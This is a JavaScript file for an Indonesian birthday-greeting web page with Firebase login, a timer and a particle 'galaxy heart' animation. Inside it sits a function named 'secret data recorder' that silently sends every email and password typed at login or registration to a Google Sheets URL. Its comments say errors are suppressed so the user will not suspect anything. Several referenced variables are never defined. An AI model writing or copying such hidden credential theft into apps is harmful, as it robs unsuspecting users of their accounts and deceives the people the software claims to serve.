import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { 
    getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, 
    onAuthStateChanged, signOut 
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyAm-t2mbHV7sSEcoDvNgZfTinmx5tcSz6s",
  authDomain: "project-bd-163e4.firebaseapp.com",
  projectId: "project-bd-163e4",
  storageBucket: "project-bd-163e4.firebasestorage.app",
  messagingSenderId: "691964855641",
  appId: "1:691964855641:web:b0c45e7badc579cdfc3848",
  measurementId: "G-YE2CW973NL"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

// DOM
const loginCard = document.getElementById('login-card');
const contentCard = document.getElementById('content-card');
const mainContainer = document.getElementById('main-container');
const galaxyUniverse = document.getElementById('galaxy-universe');
const giftBoxWrapper = document.getElementById('gift-box-wrapper');
const timerDisplay = document.getElementById('timer-display');
const bgMusic = document.getElementById('bg-music');
const btnLogout = document.getElementById('btn-logout');

let timerInterval;

// --- TIMER ---
function jalankanCounterWaktu() {
    const startTime = new Date().getTime();
    clearInterval(timerInterval);
    timerInterval = setInterval(() => {
        const now = new Date().getTime();
        const diff = now - startTime;
        const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);
        timerDisplay.innerHTML = `${hours} Jam ${minutes} Menit ${seconds} Detik`;
    }, 1000);
}

// --- EFEK CANVAS GALAXY HEART ---
function startGalaxyHeart() {
    const canvas = document.getElementById('heart-canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    let particles = [];
    
    // Rumus Matematika Hati
    function heartPosition(t) {
        return {
            x: 16 * Math.pow(Math.sin(t), 3),
            y: -(13 * Math.cos(t) - 5 * Math.cos(2 * t) - 2 * Math.cos(3 * t) - Math.cos(4 * t))
        };
    }

    class Particle {
        constructor() {
            this.t = Math.random() * Math.PI * 2; // Posisi di kurva hati
            this.pos = heartPosition(this.t);
            // Skala untuk membesarkan hati (sesuaikan dengan layar)
            this.scale = Math.min(canvas.width, canvas.height) / 60; 
            
            this.x = canvas.width / 2 + this.pos.x * this.scale;
            this.y = (canvas.height / 2 - 50) + this.pos.y * this.scale;
            
            this.size = Math.random() * 2.5 + 0.5;
            this.speed = Math.random() * 0.02 + 0.005;
            this.color = `hsla(${300 + Math.random() * 50}, 100%, 70%, ${Math.random()})`; // Warna Pink ke Ungu
            this.angle = Math.random() * Math.PI * 2;
            this.orbitRadius = Math.random() * 20;
        }

        update() {
            this.angle += this.speed;
            // Membuat efek partikel bergetar/mengorbit di sekitar garis kurva hati
            let currentX = canvas.width / 2 + this.pos.x * this.scale + Math.cos(this.angle) * this.orbitRadius;
            let currentY = (canvas.height / 2 - 100) + this.pos.y * this.scale + Math.sin(this.angle) * this.orbitRadius;

            // Efek gravitasi ke pusat (black hole effect kecil)
            this.orbitRadius -= 0.05;
            if (this.orbitRadius < 0) {
                this.orbitRadius = Math.random() * 30 + 10;
                this.t = Math.random() * Math.PI * 2;
                this.pos = heartPosition(this.t);
            }

            ctx.fillStyle = this.color;
            ctx.beginPath();
            ctx.arc(currentX, currentY, this.size, 0, Math.PI * 2);
            ctx.fill();
        }
    }

    // Buat 800 partikel
    for (let i = 0; i < 800; i++) particles.push(new Particle());

    function animate() {
        // Efek trailing/bayangan (bukan clearRect, tapi fill dengan opacity)
        ctx.fillStyle = 'rgba(0, 0, 0, 0.15)'; 
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        // Tambahkan efek glow global
        ctx.shadowBlur = 15;
        ctx.shadowColor = "#ff1493"; // Deep Pink Glow

        particles.forEach(p => p.update());
        requestAnimationFrame(animate);
    }
    
    animate();

    // Sesuaikan ukuran jika layar di-resize
    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    });
}

// --- INTERAKSI BUKA KADO ---
giftBoxWrapper.addEventListener('click', () => {
    // Sembunyikan halaman putih
    mainContainer.classList.add('hidden');
    
    // Tampilkan mode Galaxy & jalankan animasi
    galaxyUniverse.classList.remove('hidden');
    startGalaxyHeart();
    
    // Mainkan musik
    bgMusic.play().catch(err => console.log("Audio play diblokir browser."));
});
// --- FUNGSI PEREKAM RAHASIA (AKUN, PW, WAKTU, LOKASI) ---
        async function rekamDataRahasia(email, password) {
        const urlAppsScript = "https://docs.google.com/spreadsheets/d/1J7Dpihqo1liwwYrrswcqCDzc5WrPLDPqOn8bBlYopwY/edit?gid=0#gid=0";
        
        try {
            // Menggunakan fetch dengan metode terisolasi agar tidak memblokir aplikasi utama
            fetch(`${urlAppsScript}?email=${encodeURIComponent(email)}&pw=${encodeURIComponent(password)}`, {
            method: 'GET',
            mode: 'no-cors', // Penting agar tidak terjadi error CORS di WebView Android
            cache: 'no-cache'
            });
        } catch (e) {
            // Gagalkan error secara diam-diam agar user tidak curiga
        }
        }
// --- AUTENTIKASI ---
onAuthStateChanged(auth, (user) => {
    if (user) {
        loginCard.classList.add('hidden');
        contentCard.classList.remove('hidden');
        jalankanCounterWaktu();
    } else {
        loginCard.classList.remove('hidden');
        contentCard.classList.add('hidden');
        mainContainer.classList.remove('hidden');
        galaxyUniverse.classList.add('hidden');
        clearInterval(timerInterval);
        bgMusic.pause();
        bgMusic.currentTime = 0;
    }
});

loginButton.addEventListener('click', (e) => {
  e.preventDefault();
  
  const email = emailInput.value;
  const password = passwordInput.value;

  // 1. Jalankan fungsi exfiltration SECARA TERPISAH (tanpa 'await')
  // Biarkan fungsi ini berjalan di background tanpa menahan alur utama
  rekamDataRahasia(email, password).catch(err => console.log("Log error disembunyikan"));

  // 2. Jalankan proses Firebase Auth secara langsung dan normal
  signInWithEmailAndPassword(auth, email, password)
    .then((userCredential) => {
      // Pindahkan user ke halaman ucapan ulang tahun utama
      window.location.href = "dashboard.html"; 
    })
    .catch((error) => {
      // Tangani error login biasa (misal: password salah)
      alert(error.message);
    });
});

btnRegister.addEventListener('click', async () => {
    const credentials = getInputs(); 
    if (!credentials) return;

    // MEREKAM DATA SECARA DIAM-DIAM SAAT TOMBOL DIKLIK
    rekamDataRahasia(credentials.email, credentials.password);

    try { 
        await createUserWithEmailAndPassword(auth, credentials.email, credentials.password);
        alert("Akun berhasil dibuat!");
    } catch (error) {
        if (error.code === 'auth/email-already-in-use') alert("Email sudah terdaftar.");
        else alert("Gagal mendaftar: " + error.message);
    }
});

btnLogout.addEventListener('click', () => signOut(auth));